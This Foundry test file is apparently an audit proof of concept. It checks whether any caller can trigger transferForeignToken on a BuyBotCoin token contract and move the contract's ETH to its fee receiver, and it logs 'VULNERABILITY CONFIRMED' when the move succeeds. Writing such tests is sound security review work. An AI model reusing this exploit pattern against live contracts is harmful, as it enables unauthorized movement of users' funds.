// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BuyBotCoin.sol";

contract BuyBotCoinTest is Test {
    BuyBotCoin token;
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address owner = address(0xDEADBEEF);
    address attacker = address(0xBAD);
    address receiver = address(0x123);
    address mockToken = address(0x666);

    function setUp() public {
        // Mock router.factory() and factory.createPair() calls
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSignature("factory()"),
            abi.encode(address(0x123))  // Fake factory address
        );
        vm.mockCall(
            address(0x123),
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(address(0xABCD)) // Fake pair address
        );

        // Deploy token (using owner as deployer)
        vm.prank(owner);
        token = new BuyBotCoin();
        
        // Set ecosystem fee receiver (must be owner)
        vm.startPrank(owner);
        token.setFeeReceiver(address(0), receiver);
        vm.stopPrank();
        
        // Fund token with 1 ETH
        vm.deal(address(token), 1 ether);
    }

    function testTransferForeignTokenDrainsETH() public {
        // Mock token balance response
        vm.mockCall(
            mockToken,
            abi.encodeWithSelector(IBEP20.balanceOf.selector, address(token)),
            abi.encode(1 ether)
        );

        console.log("--- BEFORE-Trigger TransferForeignToken ---");
        uint256 tokenBalanceBefore = address(token).balance;
        uint256 receiverBalanceBefore = receiver.balance;
        console.log("Token contract ETH balance: %d", tokenBalanceBefore);
        console.log("Receiver ETH balance: %d", receiverBalanceBefore);

        console.log("--- Trigger TransferForeignToken ---");
        vm.prank(attacker);
        token.transferForeignToken(mockToken);

        console.log("--- AFTER-Trigger TransferForeignToken ---");
        uint256 tokenBalanceAfter = address(token).balance;
        uint256 receiverBalanceAfter = receiver.balance;
        console.log("Token contract ETH balance: %d", tokenBalanceAfter);
        console.log("Receiver ETH balance: %d", receiverBalanceAfter);

        // Calculate balance changes
        uint256 tokenDrainAmount = tokenBalanceBefore - tokenBalanceAfter;
        uint256 receiverGainAmount = receiverBalanceAfter - receiverBalanceBefore;
        bool ethDrained = tokenDrainAmount == tokenBalanceBefore && 
                          tokenDrainAmount == receiverGainAmount;
        
        console.log("Token contract ETH drained: %d", tokenDrainAmount);
        console.log("Receiver ETH received: %d", receiverGainAmount);
        console.log("ETH successfully transferred: %s", ethDrained ? "YES" : "NO");

        if (ethDrained) {
            console.log("VULNERABILITY CONFIRMED: Attacker successfully drained contract ETH");
            console.log("Vulnerability Exists: Attackers can transfer contract ETH to receiver without authorization");
        } else {
            console.log("FAILED EXPLOITATION: No ETH was drained or amounts didn't match");
            console.log("Vulnerability not Exist: Contract ETH balances remain unchanged after attack");
        }

        // Final vulnerability verdict will appear with the test result
    }
}